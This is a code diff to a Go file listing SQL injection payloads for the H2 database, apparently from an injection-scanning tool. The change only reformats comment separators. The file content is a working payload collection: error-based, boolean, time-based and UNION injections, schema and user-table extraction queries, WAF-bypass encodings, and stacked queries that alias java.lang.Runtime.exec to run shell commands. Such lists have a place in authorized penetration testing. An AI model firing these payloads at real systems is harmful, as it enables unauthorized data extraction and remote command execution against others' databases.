@@ -4,9 +4,9 @@ package payloads
 var H2 = PayloadGroup{
 	DBMS: "H2",
 	Payloads: []Payload{
-		// ═══════════════════════════════════════════
+		// ===========================================
 		// ERROR-BASED
-		// ═══════════════════════════════════════════
+		// ===========================================
 		{Type: "error", Content: "' AND 1=CAST(CURRENT_DATE AS SIGNED)--"},
 		{Type: "error", Content: "' AND 1=CAST(CURRENT_TIME AS SIGNED)--"},
 		{Type: "error", Content: "' AND 1=CAST(CURRENT_TIMESTAMP AS SIGNED)--"},
@@ -16,9 +16,9 @@ var H2 = PayloadGroup{
 		{Type: "error", Content: "' AND 1=CAST((SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS LIMIT 1) AS SIGNED)--"},
 		{Type: "error", Content: "' AND 1=X'00'--"}, // H2-specific: invalid hex
 
-		// ═══════════════════════════════════════════
+		// ===========================================
 		// BOOLEAN-BASED
-		// ═══════════════════════════════════════════
+		// ===========================================
 		{Type: "boolean", Content: "' AND 1=1--", Expected: "true"},
 		{Type: "boolean", Content: "' AND 1=2--", Expected: "false"},
 		{Type: "boolean", Content: "' AND (SELECT 1)=(SELECT 1)--", Expected: "true"},
@@ -26,17 +26,17 @@ var H2 = PayloadGroup{
 		{Type: "boolean", Content: "') AND 1=1--", Expected: "true"},
 		{Type: "boolean", Content: "') AND 1=2--", Expected: "false"},
 
-		// ═══════════════════════════════════════════
+		// ===========================================
 		// TIME-BASED (H2: SLEEP via function alias)
-		// ═══════════════════════════════════════════
+		// ===========================================
 		{Type: "time", Content: "' AND SLEEP(5)--"},
 		{Type: "time", Content: "'; CALL SLEEP(5)--"},
 		{Type: "time", Content: "' UNION SELECT SLEEP(5)--"},
 		{Type: "time", Content: "') AND SLEEP(5)--"},
 
-		// ═══════════════════════════════════════════
+		// ===========================================
 		// UNION-BASED
-		// ═══════════════════════════════════════════
+		// ===========================================
 		{Type: "union", Content: "' UNION SELECT 1--"},
 		{Type: "union", Content: "' UNION SELECT 1,2--"},
 		{Type: "union", Content: "' UNION SELECT 1,2,3--"},
@@ -44,9 +44,9 @@ var H2 = PayloadGroup{
 		{Type: "union", Content: "' UNION SELECT NULL,NULL,NULL--"},
 		{Type: "union", Content: "') UNION SELECT 1,2,3--"},
 
-		// ═══════════════════════════════════════════
+		// ===========================================
 		// DATA EXTRACTION
-		// ═══════════════════════════════════════════
+		// ===========================================
 		{Type: "deep", Content: "' UNION SELECT TABLE_SCHEMA||'.'||TABLE_NAME FROM INFORMATION_SCHEMA.TABLES--"},
 		{Type: "deep", Content: "' UNION SELECT COLUMN_NAME||':'||DATA_TYPE FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='USERS'--"},
 		{Type: "deep", Content: "' UNION SELECT H2VERSION()--"},
@@ -54,15 +54,15 @@ var H2 = PayloadGroup{
 		{Type: "deep", Content: "' UNION SELECT USER()--"},
 		{Type: "deep", Content: "' UNION SELECT CURRENT_SCHEMA()--"},
 
-		// ═══════════════════════════════════════════
+		// ===========================================
 		// STACKED QUERIES
-		// ═══════════════════════════════════════════
+		// ===========================================
 		{Type: "stacked", Content: "'; CREATE ALIAS IF NOT EXISTS SHELLEXEC FOR \"java.lang.Runtime.exec\";--"},
 		{Type: "stacked", Content: "'; CALL SHELLEXEC('id')--"},
 
-		// ═══════════════════════════════════════════
+		// ===========================================
 		// WAF BYPASS
-		// ═══════════════════════════════════════════
+		// ===========================================
 		{Type: "bypass", Content: "'/**/OR/**/1=1--"},
 		{Type: "bypass", Content: "'%0AOR%0A1=1--"},
 		{Type: "bypass", Content: "'%0AAND%0A1%3D1--"},
